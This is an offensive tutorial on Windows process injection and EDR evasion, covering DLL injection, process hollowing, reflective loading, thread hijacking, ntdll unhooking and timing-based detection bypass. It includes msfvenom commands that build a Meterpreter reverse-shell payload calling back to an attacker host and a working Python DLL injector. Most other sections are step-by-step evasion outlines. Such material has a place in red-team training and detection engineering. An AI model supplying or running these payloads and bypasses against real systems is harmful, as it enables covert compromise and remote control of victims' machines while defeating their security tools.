# Process Injection and Execution Techniques Guide

## Introduction

Process injection is a core evasion technique that allows malicious code to execute within the address space of a legitimate process. By running inside a trusted process, injected code inherits the process's security context, bypassing many application whitelisting and behavioral detection controls. This guide covers practical injection methods including DLL injection, process hollowing, reflective DLL injection, and thread hijacking, along with detection considerations for each technique.

Modern EDR solutions employ user-mode hooking, kernel callbacks, and ETW (Event Tracing for Windows) to detect injection. Effective evasion requires understanding these detection mechanisms and selecting injection techniques that minimize observable artifacts while achieving the desired execution context.

## Practical Steps

### 1. Classic DLL Injection

```bash
# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4443 \
  -f dll -o inject.dll

# Python injector using ctypes
python3 -c "
import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Open target process
PROCESS_ALL_ACCESS = 0x1F0FFF
pid = int(input('Target PID: '))
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not h_process:
    print(f'Failed to open process: {ctypes.get_last_error()}')
    exit(1)

# Allocate memory in target process
dll_path = 'C:\\\\temp\\\\inject.dll'
size = len(dll_path) + 1
remote_mem = kernel32.VirtualAllocEx(h_process, None, size, 0x3000, 0x40)
print(f'Allocated at: 0x{remote_mem:X}')

# Write DLL path to target process
written = ctypes.c_size_t()
kernel32.WriteProcessMemory(h_process, remote_mem, dll_path.encode(), size, ctypes.byref(written))

# Find LoadLibraryA address
h_module = kernel32.GetModuleHandleW('kernel32.dll')
load_library = kernel32.GetProcAddress(h_module, b'LoadLibraryA')

# Create remote thread
thread_id = ctypes.c_ulong()
kernel32.CreateRemoteThread(h_process, None, 0, load_library, remote_mem, 0, ctypes.byref(thread_id))
print(f'Remote thread created: TID={thread_id.value}')
kernel32.CloseHandle(h_process)
"
```

### 2. Process Hollowing

```python
# Process hollowing technique outline
python3 -c "
import struct

# Steps for process hollowing:
# 1. Create suspended legitimate process
# 2. Read PEB to find image base address
# 3. Unmap the legitimate image (NtUnmapViewOfSection)
# 4. Allocate memory at the same base address
# 5. Write malicious PE headers and sections
# 6. Fix relocations
# 7. Update PEB image base
# 8. Set entry point and resume thread

steps = [
    'CreateProcess(suspended) -> CREATE_SUSPENDED flag',
    'Read PEB -> NtQueryInformationProcess',
    'Unmap image -> NtUnmapViewOfSection',
    'Allocate -> VirtualAllocEx at original base',
    'Write PE -> WriteProcessMemory for headers + sections',
    'Relocate -> fix RVAs for new base address',
    'Update PEB -> write new ImageBaseAddress',
    'Resume -> SetThreadContext + ResumeThread',
]
for i, step in enumerate(steps, 1):
    print(f'  Step {i}: {step}')
"
```

### 3. Reflective DLL Injection

```bash
# Generate position-independent shellcode for reflective loading
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4443 \
  -f raw -o reflective_payload.bin

# Use sRDI (Shellcode Reflective DLL Injection) to convert DLL to shellcode
python3 -c "
# sRDI converts a DLL into position-independent shellcode
# that resolves its own imports and calls DllMain

# Key advantages over classic injection:
# - No LoadLibraryA call (detected by API monitoring)
# - No file on disk (memory-only)
# - Self-resolving imports (no IAT modification)

print('Reflective DLL Injection workflow:')
print('1. Convert DLL to shellcode using sRDI')
print('2. Allocate memory in target process')
print('3. Write shellcode to allocated memory')
print('4. Create remote thread at shellcode base')
print('5. Shellcode self-resolves imports and calls DllMain')
"
```

### 4. Thread Hijacking

```bash
# Thread hijacking injects code by modifying existing thread context
python3 -c "
# Thread hijacking workflow:
# 1. Open target process and find an active thread
# 2. Suspend the target thread
# 3. Get thread context (register state)
# 4. Allocate memory and write shellcode
# 5. Modify RIP/EIP to point to shellcode
# 6. Set thread context and resume

# Advantage: no CreateRemoteThread (commonly monitored)
# Disadvantage: may crash the hijacked thread if not restored

import struct

# Simulated register state manipulation
print('Thread Hijacking Steps:')
print('1. OpenThread -> THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT')
print('2. SuspendThread -> pause target thread')
print('3. GetThreadContext -> save register state')
print('4. VirtualAllocEx -> allocate shellcode buffer')
print('5. WriteProcessMemory -> write shellcode')
print('6. Modify CONTEXT.Rip -> point to shellcode')
print('7. SetThreadContext -> apply modified context')
print('8. ResumeThread -> execution continues at shellcode')
"
```

### 5. API Unhooking

```bash
# Bypass user-mode API hooks placed by EDR
python3 -c "
# EDR products hook ntdll.dll functions in user space
# API unhooking restores original ntdll bytes from a clean copy

# Method 1: Fresh ntdll mapping from disk
print('API Unhooking Method 1: Re-mapping ntdll from disk')
print('1. Open ntdll.dll from System32 on disk')
print('2. Map as IMAGE (read-only copy)')
print('3. Find .text section in mapped copy')
print('4. Copy clean .text bytes over hooked ntdll')
print('5. Clean functions restored: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx')
print()

# Method 2: Direct syscall stubs
print('API Unhooking Method 2: Direct syscalls')
print('1. Read syscall numbers from clean ntdll copy')
print('2. Build syscall stubs dynamically in memory')
print('3. Call syscalls directly (bypass user-mode hooks)')
print('4. No ntdll API calls needed for critical operations')
print()

# Method 3: Hardware breakpoint hooking
print('API Unhooking Method 3: VEH + Hardware Breakpoints')
print('1. Set hardware breakpoint on target function')
print('2. Register Vectored Exception Handler')
print('3. On breakpoint hit, redirect to custom handler')
print('4. Handler performs operation and resumes execution')
"
```

### 6. Injection Detection Bypass

```python
# Timing-based detection evasion
python3 -c "
import time, random

def evasive_inject(delay_seconds=60):
    '''Add delays between injection steps to evade behavioral analysis.'''
    steps = [
        'Open target process',
        'Allocate remote memory',
        'Write payload to memory',
        'Create remote thread',
    ]
    for i, step in enumerate(steps):
        jitter = random.uniform(0.5, 2.0)
        print(f'  [{i+1}/{len(steps)}] {step}')
        time.sleep(jitter)
    print('Injection complete (evasive timing)')

print('Evasive injection with randomized delays:')
evasive_inject()
"
```

## Hands-on Exercises

### Exercise 1: DLL Injection Lab

Set up a Windows VM with a monitoring tool (Process Monitor). Inject a benign DLL (e.g., one that pops a message box) into notepad.exe using the classic DLL injection technique. Document which API calls are visible in Process Monitor and identify detection opportunities.

### Exercise 2: Compare Injection Techniques

Implement three different injection techniques (classic DLL, process hollowing, reflective DLL) against the same target process. Compare the artifacts each technique leaves in Process Monitor, and document which technique produces the fewest observable indicators.

## References

- MITRE ATT&CK T1055 — Process Injection — https://attack.mitre.org/techniques/T1055/
- Windows API Documentation — https://learn.microsoft.com/en-us/windows/win32/api/
- sRDI Project — https://github.com/monoxgas/sRDI
- Elastic Security Labs — Process Injection Detection — https://www.elastic.co/security-labs
